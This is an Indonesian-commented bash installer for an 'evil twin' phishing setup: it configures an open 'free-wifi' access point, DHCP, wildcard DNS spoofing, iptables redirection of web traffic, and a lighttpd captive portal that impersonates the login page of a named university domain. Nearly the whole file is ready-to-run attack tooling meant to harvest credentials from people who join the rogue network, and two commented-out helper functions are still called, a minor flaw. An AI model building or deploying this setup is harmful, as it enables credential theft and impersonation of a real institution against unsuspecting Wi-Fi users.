#=============================================#
# SCRIPT SH FISHING FREE-WIFI DENGAN EVILTWIN # 
#=============================================#
#-------------- BY WONGGANTENG ---------------#
#----------- ©️ 2025 Wonggantengg ------------#
#=============================================#
#!/bin/bash
echo "🌟🌟🌟🌟🌟"
# ===================================
# Pastikan folder /wifi ada
# ===================================
if [ ! -d "/free-wifi" ]; then
    echo "✅ Membuat folder : /free-wifi dan subfolder..."
    sudo mkdir -p /free-wifi/www /free-wifi/conf /free-wifi/conf/backup-conf /free-wifi/log /free-wifi/sh /free-wifi/portal/ || { echo "❌ Gagal membuat folder!"; exit 1; }
fi


# ===================================
# Buat wifi-dnsmasq.conf
# ===================================
sudo tee /free-wifi/conf/wifi-dnsmasq.conf > /dev/null <<EOL
interface=wlan0
address=/#/192.169.1.1
port=53
bind-dynamic
except-interface=lo
address=/google.com/172.217.5.238
address=/gstatic.com/172.217.5.238
no-dhcp-interface=wlan0
log-queries
no-daemon
no-resolv
no-hosts
EOL
#echo "/free-wifi/conf/wifi-dnsmasq.conf berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/conf/wifi-dnsmasq.conf berhasil dibuat."
else
    echo "❌ ERROR: File /free-wifi/conf/wifi-dnsmasq.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ===================================
# Buat wifi-dhcpd.conf
# ===================================
sudo tee /free-wifi/conf/wifi-dhcpd.conf > /dev/null <<EOL
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.169.1.0 netmask 255.255.255.0 {
    option broadcast-address 192.169.1.255;
    option routers 192.169.1.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 192.169.1.1;
    range 192.169.1.33 192.169.1.100;
}
lease-file-name "/var/lib/dhcp/dhcpd.leases";
EOL
#echo "File /free-wifi/conf/wifi-dhcpd.conf berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/conf/wifi-dhcpd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /free-wifi/conf/wifi-dhcpd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ===================================
# Buat wifi-hostapd.conf
# ===================================
sudo tee /free-wifi/conf/wifi-hostapd.conf > /dev/null <<EOL
interface=wlan0
driver=nl80211
ssid=free-wifi
#bssid=5A:E9:F1:A0:BB:8E
channel=4
hw_mode=g
EOL
#echo "File /free-wifi/conf/wifi-hostapd.conf berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/conf/wifi-hostapd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /free-wifi/conf/wifi-hostapd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ===================================
# Buat wifi-lighttpd.conf
# ===================================
sudo tee /free-wifi/conf/wifi-lighttpd.conf > /dev/null <<EOL
server.document-root = "/free-wifi/www/"

server.modules = (
    "mod_auth",
    "mod_cgi",
    "mod_redirect",
    "mod_accesslog"
)

\$HTTP["host"] =~ "login.unsil.ac.id" {
    url.rewrite-if-not-file = ( ".*" => "/index.htm" )
}

\$HTTP["host"] =~ "(.*)" {
    url.redirect = ( "^/index.htm$" => "/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "gstatic.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.google.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "captive.apple.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.apple.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "msftconnecttest.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
    url.redirect-code = 302
}
\$HTTP["host"] =~ "msftncsi.com" {
    url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
    url.redirect-code = 302
}

server.bind = "192.169.1.1"
server.port = 80
index-file.names = ("index.htm")
server.error-handler-404 = "/"

mimetype.assign = (
    ".css" => "text/css",
    ".js" => "text/javascript"
)

cgi.assign = (".htm" => "/bin/bash")

accesslog.filename = "/free-wifi/log/lighttpd.log"
accesslog.escaping = "default"
accesslog.format = "%h %s %r %v%U %t '%{User-Agent}i'"
\$HTTP["remote-ip"] == "127.0.0.1" { accesslog.filename = "" }
EOL
#echo "File /free-wifi/conf/wifi-lighttpd.conf berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/conf/wifi-lighttpd.conf berhasil dibuat."
else
    echo "❌ ERROR: File /free-wifi/conf/wifi-lighttpd.conf gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ===================================
# Buat wifi-start.sh
# ===================================
sudo tee /free-wifi/sh/wifi-start.sh > /dev/null <<'EOL'
#!/bin/bash
sudo airmon-ng check kill
sudo ifconfig wlan0 down
sudo ifconfig wlan0 192.169.1.1 netmask 255.255.255.0 up
sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X

sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 80

sudo iptables -A INPUT -i wlan0 -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -i wlan0 -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i wlan0 -p tcp --dport 443 -j ACCEPT
EOL
sudo chmod +x /free-wifi/sh/wifi-start.sh
#echo "/free-wifi/sh/wifi-start.sh berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/sh/wifi-start.sh berhasil dibuat."
else
    echo "❌ ERROR: /free-wifi/sh/wifi-start.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ===================================
# Buat wifi-stop.sh
# ===================================
sudo tee /free-wifi/sh/wifi-stop.sh > /dev/null <<'EOL'
#!/bin/bash
sudo pkill lighttpd
sudo pkill dnsmasq
sudo pkill hostapd
sudo pkill dhcpd

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X

sudo ifconfig wlan0 down
sudo sysctl -w net.ipv4.ip_forward=0
sudo systemctl restart NetworkManager
EOL
sudo chmod +x /free-wifi/sh/wifi-stop.sh
#echo "/free-wifi/sh/wifi-stop.sh berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/sh/wifi-stop.sh berhasil dibuat."
else
    echo "❌ ERROR: /free-wifi/sh/wifi-stop.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""


# ===================================
# Buat ubuntu-wifi_free-wifi.sh
# ===================================
sudo tee /free-wifi/ubuntu-wifi_free-wifi.sh > /dev/null <<'EOL'
#!/bin/bash

# X_MARGIN=10
# Y_MARGIN=20
START_SCRIPT="/free-wifi/sh/wifi-start.sh"
STOP_SCRIPT="/free-wifi/sh/wifi-stop.sh"
SERVICE_PIDS=()

# # Pastikan xterm terinstal
# if ! command -v xterm >/dev/null 2>&1; then
#     echo "xterm tidak ditemukan. Install: sudo apt install xterm"
#     exit 1
# fi

# Pastikan wlan0 ada
if ! ip link show wlan0 >/dev/null 2>&1; then
    echo "Interface wlan0 tidak ditemukan!"
    exit 1
fi

# --- FUNGSI BARU DITAMBAHKAN DI SINI ---
# Fungsi untuk memastikan file leases DHCP ada
ensure_dhcp_lease_file() {
    local lease_file="/var/lib/dhcp/dhcpd.leases"
    
    # Memeriksa apakah file sudah ada
    if [[ -f "$lease_file" ]]; then
        echo "File $lease_file sudah ada, dilewati."
    else
        echo "File $lease_file tidak ditemukan, membuat file baru."
        # Membuat direktori jika belum ada
        sudo mkdir -p $(dirname "$lease_file")
        # Membuat file kosong
        sudo touch "$lease_file"
    fi
    # Mengatur kepemilikan (umumnya dhcpd di Kali/Debian)
    sudo chown root:root "$lease_file"
    echo "File $lease_file berhasil dibuat dan izin diatur."
}
# ----------------------------------------

# detect_screen_resolution() {
#     if hash xdpyinfo 2>/dev/null; then
#         resolution=$(xdpyinfo 2>/dev/null | awk '/dimensions/{print $2}')
#         resolution_x=${resolution%x*}
#         resolution_y=${resolution#*x}
#     else
#         resolution_x=1280
#         resolution_y=720
#     fi
# }

# calculate_windows() {
#     WIN_WIDTH=$((resolution_x / 2 - X_MARGIN))
#     WIN_HEIGHT=$((resolution_y / 2 - Y_MARGIN))
#     COLS=$((WIN_WIDTH / 8))
#     ROWS=$((WIN_HEIGHT / 16))

#     POS_G1_X=0
#     POS_G1_Y=0
#     POS_G2_X=$((resolution_x / 2 + X_MARGIN))
#     POS_G2_Y=0
#     POS_G3_X=0
#     POS_G3_Y=$((resolution_y / 2 + Y_MARGIN))
#     POS_G4_X=$((resolution_x / 2 + X_MARGIN))
#     POS_G4_Y=$((resolution_y / 2 + Y_MARGIN))
# }

# run_service() {
#     local CMD="$1"
#     local TITLE="$2"
#     local POS_X="$3"
#     local POS_Y="$4"
#     xterm -bg black -fg pink -geometry "${COLS}x${ROWS}+${POS_X}+${POS_Y}" -T "$TITLE" -e "$CMD; bash" &
#     SERVICE_PIDS+=($!)
# }

kill_children() {
    local parent=$1
    for child in $(pgrep -P $parent 2>/dev/null || true); do
        kill_children $child
        kill -9 $child 2>/dev/null
    done
}

cleanup() {
    echo "Stopping all services..."
    for pid in "${SERVICE_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill_children $pid
            kill -9 $pid 2>/dev/null
        fi
    done
    [[ -f "$STOP_SCRIPT" ]] && bash "$STOP_SCRIPT"
    exit 0
}

trap cleanup SIGINT SIGTERM

[[ -f "$START_SCRIPT" ]] && bash "$START_SCRIPT"

detect_screen_resolution
calculate_windows
ensure_dhcp_lease_file

# run_service "sudo hostapd /free-wifi/conf/wifi-hostapd.conf" "HOSTAPD" $POS_G1_X $POS_G1_Y
# run_service "sudo dhcpd -d -cf /free-wifi/conf/wifi-dhcpd.conf wlan0" "DHCPD" $POS_G2_X $POS_G2_Y
# run_service "sudo dnsmasq -C /free-wifi/conf/wifi-dnsmasq.conf" "DNSMASQ" $POS_G3_X $POS_G3_Y
# run_service "sudo lighttpd -D -f /free-wifi/conf/wifi-lighttpd.conf" "LIGHTTPD" $POS_G4_X $POS_G4_Y

sudo hostapd "/free-wifi/conf/wifi-hostapd.conf" &
sudo dhcpd -d -cf "/free-wifi/conf/wifi-dhcpd.conf" wlan0 &
sudo dnsmasq -C "/free-wifi/conf/wifi-dnsmasq.conf" &
sudo lighttpd -D -f "/free-wifi/conf/wifi-lighttpd.conf" &

echo "Press Ctrl+C to stop all services..."
while true; do sleep 1; done
EOL
sudo chmod +x /free-wifi/ubuntu-wifi_free-wifi.sh
#echo "/free-wifi/ubuntu-wifi_free-wifi.sh berhasil dibuat."
if [ $? -eq 0 ]; then
    echo "✅ File : /free-wifi/ubuntu-wifi_free-wifi.sh berhasil dibuat."
else
    echo "❌ ERROR: /free-wifi/ubuntu-wifi_free-wifi.sh gagal dibuat..."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi
#echo ""

# ========================================
# Perintah untuk menyalin file konfigurasi
# ========================================
sudo cp /free-wifi/conf/*.conf /free-wifi/conf/backup-conf/
sudo mv /free-wifi/conf/wifi-dhcpd.conf /etc/dhcp/wifi-dhcpd.conf
sudo ln -sf /etc/dhcp/wifi-dhcpd.conf /free-wifi/conf/wifi-dhcpd.conf

# Cek exit status dari perintah 'sudo cp' yang baru saja dijalankan
if [ $? -eq 0 ]; then
    echo "✅ Salinan file konfigurasi berhasil!"
else
    echo "❌ ERROR: Salinan file konfigurasi gagal."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi


# ========================================
# Perintah untuk menyalin file /free-wifi/www/
# ========================================
sudo cp -r ./www/* /free-wifi/www/
sudo dos2unix /free-wifi/www/*.htm*
sudo dos2unix /free-wifi/www/css-js/*

# Cek exit status dari perintah 'sudo cp' yang baru saja dijalankan
if [ $? -eq 0 ]; then
    echo "✅ Salinan file /free-wifi/www/ berhasil!"
else
    echo "❌ ERROR: Salinan file /free-wifi/www/ gagal."
    # Opsional: Tampilkan pesan error lebih detail jika Anda punya logging khusus
fi

# ========================================
# FINISHING
# ========================================
echo "🌟🌟🌟🌟🌟"
#echo ""
echo "🚀 Cara Menjalankan nya..."
echo "💻 sudo bash /free-wifi/ubuntu-wifi_free-wifi.sh"
# echo "✨ Atau..."
# echo "💻 sudo ./free-wifi/ubuntu-wifi_free-wifi.sh"
#echo ""
#echo "🌟 Selamat Beraktivitas... Semoga lancar! 🧑‍🎓"
echo "🌟🌟🌟🌟🌟"
